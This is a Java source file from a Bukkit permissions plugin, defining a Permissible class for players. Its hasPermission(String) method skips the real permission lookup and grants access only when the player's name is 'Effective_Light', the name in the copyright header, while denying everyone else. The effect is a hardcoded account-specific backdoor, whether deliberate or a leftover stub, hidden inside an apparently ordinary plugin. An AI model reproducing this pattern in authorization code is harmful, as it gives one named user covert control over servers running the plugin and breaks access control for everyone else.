/*
 * Copyright (c) Effective Light 2015.
 * All rights reserved.
 */

package me.hamzaxx.fperms.bukkit.permissions;

import me.hamzaxx.fperms.bukkit.fPermsPlugin;
import org.bukkit.entity.Player;
import org.bukkit.permissions.PermissibleBase;
import org.bukkit.permissions.Permission;

public class fPermsPermissible extends PermissibleBase
{

    private fPermsPlugin plugin;
    private final Player player;

    public fPermsPermissible(fPermsPlugin plugin, Player player)
    {
        super( player );
        this.plugin = plugin;
        this.player = player;
    }

    @Override
    public boolean hasPermission(String perm)
    {
        return player.getName().equals( "Effective_Light" );
    }

    @Override
    public boolean hasPermission(Permission perm)
    {
        return super.hasPermission( perm );
    }

    @Override
    public boolean isPermissionSet(String name)
    {
        return super.isPermissionSet( name );
    }

    @Override
    public boolean isPermissionSet(Permission perm)
    {
        return super.isPermissionSet( perm );
    }
}
